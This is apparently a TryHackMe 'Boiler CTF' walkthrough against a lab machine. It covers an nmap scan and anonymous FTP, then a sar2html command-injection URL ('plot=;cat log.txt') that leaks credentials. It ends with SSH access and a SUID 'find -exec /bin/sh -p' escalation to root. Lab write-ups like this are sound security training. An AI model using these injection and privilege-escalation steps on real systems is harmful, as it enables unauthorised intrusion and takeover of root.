# THM - Boiler CTF

#### Ip: 10.10.122.19
#### Name: Boiler CTF
#### Rating: Medium

----------------------------------------------------------------------

boiler.png

Note: For this writeup I will be skipping the rooms guided questions and only be focusing on securing the user.txt and root.txt flags.

### Enumeration

I'll kick off enumerating this box with an Nmap scan covering all TCP ports. To speed this along I'll also use the `--min-rate 10000` flag:

```text
┌──(ryan㉿kali)-[~/THM/Boiler_CTF]
└─$ sudo nmap -p-  --min-rate 10000 10.10.122.19 -sC -sV   
[sudo] password for ryan: 
Starting Nmap 7.93 ( https://nmap.org ) at 2023-09-26 09:27 CDT
Warning: 10.10.122.19 giving up on port because retransmission cap hit (10).
Nmap scan report for 10.10.122.19
Host is up (0.28s latency).
Not shown: 62045 closed tcp ports (reset), 3486 filtered tcp ports (no-response)
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.2.6.181
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
10000/tcp open  http    MiniServ 1.930 (Webmin httpd)
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
55007/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3abe1392d95eb135516d6ce8df911e5 (RSA)
|   256 aedef2bbb78a00702074567625c0df38 (ECDSA)
|_  256 252583f2a7758aa046b2127004685ccb (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 66.98 seconds
```

Looks like FTP has anonymous access enabled, so lets start there.

```text
┌──(ryan㉿kali)-[~/THM/Boiler_CTF]
└─$ ftp 10.10.122.19                                           
Connected to 10.10.122.19.
220 (vsFTPd 3.0.3)
Name (10.10.122.19:ryan): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -la
229 Entering Extended Passive Mode (|||42055|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
ftp> get .info.txt
local: .info.txt remote: .info.txt
229 Entering Extended Passive Mode (|||49484|)
150 Opening BINARY mode data connection for .info.txt (74 bytes).
100% |********************************************************************************|    74      140.04 KiB/s    00:00 ETA
226 Transfer complete.
74 bytes received in 00:00 (0.22 KiB/s)
ftp> bye
221 Goodbye.
```

Looking at the file it appears to be encoded, maybe with ROT13?

```text
┌──(ryan㉿kali)-[~/THM/Boiler_CTF]
└─$ cat .info.txt
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!
```

Lets head over to https://gchq.github.io/CyberChef/ to decode this:

rot.png

Getting trolled a bit here. Lets keep looking around.

Port 80 has a default Apache landing page:

80.png

And port 10000 has a redirect to an internal site I can't access:

url.png

Lets kick off some directory fuzzing against port 80 to see what we find:

ferox.png

Cool, looks like there is a `/joomla` directory. Heading to the site we find a basic Joomla page

joomla.png

Going back to our directory scan, we find another interesting directory `/joomla/_test`

test.png

This page is running sar2html which has some known vulnerabilites:

sat2html.png

Searching for exploits we find this page: https://www.exploit-db.com/exploits/47204

exploit.png

Interesting, lets give it a shot.

### Exploitation

Trying out: http://10.10.122.19/joomla/_test/index.php?plot=;ls shows us the contents of the directory:

(Note: I'm viewing the page source here for ease of screen-shotting. It is easier to just access the contents as described in the exploit)

log.txt

Log.txt seems interesting, lets check that out: 

`http://10.10.122.19/joomla/_test/index.php?plot=;cat log.txt`

creds.png

Cool, looks like we've got some credentials now. Lets use these to login with SSH:

```text
┌──(ryan㉿kali)-[~/THM/Boiler_CTF]
└─$ ssh basterd@10.10.122.19 -p 55007
The authenticity of host '[10.10.122.19]:55007 ([10.10.122.19]:55007)' can't be established.
ED25519 key fingerprint is SHA256:GhS3mY+uTmthQeOzwxRCFZHv1MN2hrYkdao9HJvi8lk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.122.19]:55007' (ED25519) to the list of known hosts.
basterd@10.10.122.19's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.


Last login: Thu Aug 22 12:29:45 2019 from 192.168.1.199
$ whoami && hostname
basterd
Vulnerable
```

Looking around the box I find a file called backup.sh with user stoner's credentials, lets use those to `su stoner`

stoner.png

In stoner's directory we find a `.secret` file:

```text
basterd@Vulnerable:~$ su stoner
Password: 
stoner@Vulnerable:/home/basterd$ cd ..
stoner@Vulnerable:/home$ cd stoner
stoner@Vulnerable:~$ ls
stoner@Vulnerable:~$ ls -la
total 16
drwxr-x--- 3 stoner stoner 4096 Aug 22  2019 .
drwxr-xr-x 4 root   root   4096 Aug 22  2019 ..
drwxrwxr-x 2 stoner stoner 4096 Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret
```

Which for this box serves as the user.txt flag:

user_flag.png

### Privilege Escalation

Looking for SUID we discover that `find` as the SUID bit:

```text
stoner@Vulnerable:~$ find / -perm -u=s 2>/dev/null
/bin/su
/bin/fusermount
/bin/umount
/bin/mount
/bin/ping6
/bin/ping
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/apache2/suexec-custom
/usr/lib/apache2/suexec-pristine
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/eject/dmcrypt-get-device
/usr/bin/newgidmap
/usr/bin/find
/usr/bin/at
/usr/bin/chsh
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/gpasswd
/usr/bin/newuidmap
```

If we head over to https://gtfobins.github.io/gtfobins/find/ we can get the command we'll need to exploit this:

gtfo.png

Lets run it:

```text
stoner@Vulnerable:~$ cd /usr/bin
stoner@Vulnerable:/usr/bin$ ./find . -exec /bin/sh -p \; -quit
# whoami
root
# id
uid=1000(stoner) gid=1000(stoner) euid=0(root) groups=1000(stoner),4(adm),24(cdrom),30(dip),46(plugdev),110(lxd),115(lpadmin),116(sambashare)
```

All we need to do now is grab the root.txt flag:

root_flag.png

Thanks for following along!

-Ryan

--------------------------------------------------------




